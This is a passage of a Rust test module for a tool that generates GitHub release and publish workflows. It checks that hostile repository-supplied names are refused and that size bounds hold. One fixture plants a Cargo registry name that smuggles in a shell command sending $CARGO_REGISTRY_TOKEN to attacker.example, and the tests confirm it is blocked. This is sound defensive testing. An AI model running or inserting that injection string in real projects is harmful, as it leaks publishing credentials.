                    !carries(&plain, value) && !carries(&expressions, value),
                    "{origin} now reaches managed content; give it a roster row naming the surface it lands on"
                );
            }
        }

        let [default, prefixed] = shell_counts.as_slice() else {
            panic!("both prefixes were derived");
        };
        assert_eq!(
            default, prefixed,
            "the sweep finds the same managed shell under a configured prefix as under the default"
        );
    }

    // Every name a maintained recipe reads out of the repository reaches a
    // sink that interprets text: a shell body, a `sed` address, a YAML scalar
    // printed with `printf '"%s"'`, an argument vector. Validating per sink is
    // the mistake this replaces -- the registry name was closed that way and
    // the package name reached a `sed` address through the same gap, where
    // GNU `sed`'s `e` command executes its argument. So the property asserted
    // is the boundary one: every entry in REPOSITORY_SUPPLIED refuses every
    // value in HOSTILE, with a diagnostic naming where to fix it, and nothing
    // hostile appears in a derived workflow.
    #[test]
    fn refuses_every_repository_supplied_name_that_a_sink_would_interpret() {
        for (file, template, code) in REPOSITORY_SUPPLIED {
            // A release-unit identifier meets the configuration loader first,
            // and every hostile shape dies there. The values that reach the
            // boundary are the ones the workspace admits, so those are what
            // this entry is driven with.
            let values: Vec<&str> = if template == "@RELEASE_UNIT@" {
                NARROWED.to_vec()
            } else {
                HOSTILE.to_vec()
            };
            for hostile in values {
                let workspace = if file == "component/package.json" {
                    npm_workspace("workflow-supplied-names")
                } else {
                    workspace("workflow-supplied-names")
                };
                if template == "@RELEASE_UNIT@" {
                    // The release-unit identifier is a configuration key, and
                    // it names every publication of that unit.
                    workspace.write(
                        ".intentional/config.yml",
                        &CONFIG.replace("  component:", &format!("  \"{hostile}\":")),
                    );
                } else if template == "@TOKEN_SECRET@" {
                    // A configured secret name is spliced into a
                    // `${{ secrets.NAME }}` expression, which is an identifier
                    // position: a name carrying a bracket changes what the
                    // expression evaluates rather than naming a missing secret.
                    workspace.write(
                        ".intentional/config.yml",
                        &CONFIG.replace(
                            "    cargo: { registry: {} }\n",
                            &format!(
                                "    cargo: {{ registry: {{ token-secret: \"{hostile}\" }} }}\n"
                            ),
                        ),
                    );
                } else {
                    if file == ".cargo/config.toml" {
                        // An index is only read for a registry the manifest
                        // names, so the release unit has to name one.
                        workspace.write(
                            "component/Cargo.toml",
                            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
                        );
                    }
                    workspace.write(file, &template.replace("@VALUE@", hostile));
                }
                let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None);
                let Ok(comparison) = comparison else {
                    // A configuration this malformed is refused before
                    // derivation, which is the same answer earlier.
                    continue;
                };
                assert_eq!(
                    comparison.status,
                    ComparisonStatus::Blocked,
                    "{file} carrying {hostile:?} derives a workflow"
                );
                // A value that survives its own file's syntax has to be
                // refused by the name rule; one that does not is refused
                // earlier, by the parser, which is the same answer sooner.
                let codes = comparison
                    .diagnostics
                    .iter()
                    .map(|diagnostic| diagnostic.code.clone())
                    .collect::<Vec<_>>();
                assert!(
                    codes.iter().any(|reported| reported == code)
                        || codes
                            .iter()
                            .any(|reported| reported == "publication-unresolved"),
                    "{file} carrying {hostile:?} is refused as {code} or as unparsable: {codes:?}"
                );
            }
        }
    }

    // Two names reach a maintained recipe from repository content rather than
    // from this derivation: the Cargo registry `package.publish` names, and the
    // npm package name GitHub Package Registry has to resolve. The first lands
    // in `run:` bodies that hold the registry token, so a name carrying a quote
    // is not a registry that fails to resolve, it is shell source a publisher
    // job executes while holding a credential -- and the derived workflow still
    // parses as YAML, so every structural assertion in this module passes over
    // it. The second is refused because the registry will refuse it, in a job
    // that runs after the primary has already shipped.
    #[test]
    fn refuses_a_configured_name_it_would_otherwise_carry_into_a_credentialed_script() {
        let workspace = workspace("workflow-registry-injection");
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("is not a Cargo registry name"),
            "{:?}",
            comparison.diagnostics[0]
        );

        // The same refusal covers the shape that does not even parse, so the
        // cause is named rather than reported as an invalid template.
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"alt\\nregistry\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");

        let workspace = npm_workspace("workflow-unscoped-github-package");
        workspace.write(
            "component/package.json",
            r#"{"name":"example-component","version":"1.0.0"}"#,
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "recipe-underivable");
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("under the publishing account's scope"),
            "{:?}",
            comparison.diagnostics[0]
        );
    }

    #[test]
    fn refuses_to_compare_an_unbounded_workflow() {
        let workspace = workspace("workflow-too-large");
        let padding = (0..=MAX_WORKFLOW_LINES)
            .map(|line| format!("# padding {line}\n"))
            .collect::<String>();
        workspace.write(
            "oversized.yml",
            &format!("{padding}{REPOSITORY_RELEASE_WORKFLOW}"),
        );
        let comparison = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("oversized.yml")),
        )
        .expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "workflow-too-large");
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("managed release jobs share the limit"),
            "the diagnostic names what consumes the release workflow budget: {:?}",
            comparison.diagnostics[0]
        );
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("move unrelated jobs to another workflow"),
            "the diagnostic gives the maintainer a remedy: {:?}",
            comparison.diagnostics[0]
        );
    }

    #[test]
    fn refuses_to_compare_a_workflow_with_an_unbounded_line() {
        let workspace = workspace("workflow-line-too-long");
        let oversized_line = format!("# {}", "x".repeat(2_047));
        assert_eq!(
            oversized_line.len(),
            2_049,
            "the unsafe side is fixture-owned"
        );
        workspace.write(
            "oversized-line.yml",
            &format!("{oversized_line}\n{REPOSITORY_RELEASE_WORKFLOW}"),
        );
        let comparison = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("oversized-line.yml")),
        )
        .expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "workflow-line-too-long");
    }

    #[test]
    fn refuses_to_propose_a_workflow_too_large_to_read_back() {
        let workspace = workspace("workflow-derived-too-large");
        let base_lines = REPOSITORY_RELEASE_WORKFLOW.lines().count();
        let padding = (0..(MAX_WORKFLOW_LINES - base_lines - 1))
            .map(|line| format!("# repository content {line}\n"))
            .collect::<String>();
        workspace.write(
            ".github/workflows/release.yml",
            &format!("{padding}{REPOSITORY_RELEASE_WORKFLOW}"),
        );

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "workflow-too-large")
            .expect("the derived size is refused before apply");
        assert!(
            diagnostic.message.contains("derived transformation"),
            "the diagnostic distinguishes unsafe output from untrusted input: {diagnostic:?}"
        );
    }

    #[test]
    fn intentional_publish_contract_fits_the_readback_bound() {
        let workspace = repository_scale_workspace("workflow-repository-scale");
        let config = Config::load(workspace.root()).expect("repository-scale config loads");
        assert_eq!(
            resolve_publications(workspace.root(), &config)
                .expect("repository publications resolve")
                .selected
                .len(),
            4,
            "the capacity measurement covers every configured publication"
        );
        let comparison =
            compare_configured_workflow(workspace.root(), &config, WorkflowRole::Publish, None)
                .expect("repository-scale contract derives");
        assert_eq!(
            comparison.status,
            ComparisonStatus::Different,
            "{:?}",
            comparison.diagnostics
        );
        let output = comparison.output.expect("different comparison has output");
        assert_eq!(
            output.lines().map(str::len).max(),
            Some(1_003),
            "the real derived width pins the safe side of the per-line bracket"
        );
        assert!(
            output.lines().count() <= MAX_WORKFLOW_LINES,
            "Intentional's own publication shape must remain readable after apply"
        );
        assert_eq!(
            output.lines().count(),
            1_652,
            "the real four-publication fixture pins the measured line count"
        );
        assert!(
            oversized_workflow_line(&output).is_none(),
            "Intentional's own publication shape must fit the per-line byte bound"
        );
    }

    #[test]
    fn a_fifth_cargo_shaped_publication_brackets_the_readback_bound() {
        let workspace = repository_scale_workspace("workflow-fifth-cargo-publication");
        let mut config = Config::load(workspace.root()).expect("repository-scale config loads");
        config
            .release_units
            .get_mut("intentional")
            .expect("release unit")
            .packages
            .get_mut("cli")
            .expect("Cargo application package")
            .aur = Some(crate::config::SystemPackagePublisher::default());
        assert_eq!(
            resolve_publications(workspace.root(), &config)
                .expect("expanded publications resolve")
                .selected
                .len(),
            5,
            "the expanded shape adds one Cargo publication"
        );
        let comparison =
            compare_configured_workflow(workspace.root(), &config, WorkflowRole::Publish, None)
                .expect("expanded contract compares");
        assert_eq!(comparison.status, ComparisonStatus::Different);
        let output = comparison.output.expect("expanded comparison has output");
        assert_eq!(
            output.lines().count(),
            1_860,
            "the five-publication fixture pins the measured line count"
        );

        let workflow_path = ".github/workflows/publish.yml";
        let repository_workflow = std::fs::read_to_string(workspace.root().join(workflow_path))
            .expect("repository workflow");
        let padding = |lines: usize| {
            (0..lines)
                .map(|line| format!("# repository capacity {line}\n"))
                .collect::<String>()
        };
        let remaining = MAX_WORKFLOW_LINES - output.lines().count();
        assert_eq!(
            remaining, 140,
            "the design's repository-owned capacity witness stays pinned"
        );
        workspace.write(
            workflow_path,
            &format!("{}{repository_workflow}", padding(remaining)),
        );
        let fitting =
            compare_configured_workflow(workspace.root(), &config, WorkflowRole::Publish, None)
                .expect("capacity-safe expanded contract compares");
        assert_eq!(fitting.status, ComparisonStatus::Different);
        assert_eq!(
            fitting
                .output
                .expect("capacity-safe output")
                .lines()
                .count(),
            MAX_WORKFLOW_LINES,
            "the safe side lands exactly on the settled bound"
        );

        workspace.write(
            workflow_path,
            &format!("{}{repository_workflow}", padding(remaining + 1)),
        );
        let exceeding =
            compare_configured_workflow(workspace.root(), &config, WorkflowRole::Publish, None)
                .expect("capacity-unsafe expanded contract compares");
        assert_eq!(exceeding.status, ComparisonStatus::Blocked);
        let diagnostic = exceeding
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "workflow-too-large")
            .unwrap_or_else(|| {
                panic!(
                    "one repository-owned line beyond the settled bound is refused: {:?}",
                    exceeding.diagnostics
                )
            });
        assert!(
            diagnostic
                .message
                .contains("configured publications expand the managed slice"),
            "the diagnostic names what consumes the publish workflow budget: {diagnostic:?}"
        );
        assert!(
            diagnostic
                .message
                .contains("reduce configured publication destinations"),
            "the diagnostic gives the maintainer a managed-slice remedy: {diagnostic:?}"
        );
    }

    #[test]
    fn compares_an_explicit_workflow_override() {
        let workspace = workspace("workflow-override");
        workspace.write("candidate.yml", REPOSITORY_RELEASE_WORKFLOW);
        let comparison = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("candidate.yml")),
        )
        .expect("comparison");
        assert_eq!(comparison.path, PathBuf::from("candidate.yml"));
        assert!(
            comparison.patch.contains("--- a/candidate.yml"),
            "{}",
            comparison.patch
        );
    }

    #[test]
    fn structured_result_matches_the_published_workflow_diff_schema() {
        let workspace = workspace("workflow-json");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let json: serde_json::Value =
            serde_json::from_str(&comparison.to_json().expect("json")).expect("json parses");
        assert_eq!(json["$schema"], WORKFLOW_DIFF_SCHEMA);
        assert_eq!(json["contract"], WORKFLOW_CONTRACT);
        assert_eq!(json["workflow"]["kind"], "release");
        assert_eq!(json["status"], "different");
        assert_eq!(json["changed"], true);
        assert_eq!(json["applied"], false);
        assert!(json["input-digest"]
            .as_str()
            .expect("digest")
            .starts_with("sha256:"));
        assert_eq!(
            json["diagnostics"].as_array().expect("diagnostics").len(),
            0
        );

        let blocked = compare_workflow(
            workspace.root(),
            WorkflowRole::Release,
            Some(Path::new("absent.yml")),
        )
        .expect("comparison");
        let json: serde_json::Value =
            serde_json::from_str(&blocked.to_json().expect("json")).expect("json parses");
        assert_eq!(json["status"], "blocked");
        assert!(
            json.get("patch").is_none(),
            "a blocked result carries no output claim"
        );
        assert_eq!(json["diagnostics"][0]["code"], "workflow-missing");
    }

    #[test]
    fn published_workflow_diff_schema_declares_every_emitted_field() {
        let schema: Value =
            serde_yaml::from_str(include_str!("../../../../schemas/workflow-diff.yml"))
                .expect("workflow diff schema parses");
        assert_eq!(
            schema["properties"]["$schema"]["const"].as_str(),
            Some(WORKFLOW_DIFF_SCHEMA)
        );
        assert_eq!(
            schema["properties"]["contract"]["const"].as_str(),
            Some(WORKFLOW_CONTRACT)
        );

        let workspace = workspace("workflow-schema-fields");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let emitted: serde_json::Value =
            serde_json::from_str(&comparison.to_json().expect("json")).expect("json parses");
        let declared = schema["properties"]
            .as_mapping()
            .expect("declared properties")
            .keys()
            .filter_map(Value::as_str)
            .map(str::to_owned)
            .collect::<BTreeSet<_>>();
        for key in emitted.as_object().expect("result object").keys() {
            assert!(declared.contains(key.as_str()), "{key} is declared");
        }
        for key in schema["required"].as_sequence().expect("required fields") {
            let key = key.as_str().expect("required field name");
            assert!(emitted.get(key).is_some(), "{key} is emitted");
        }
    }
}
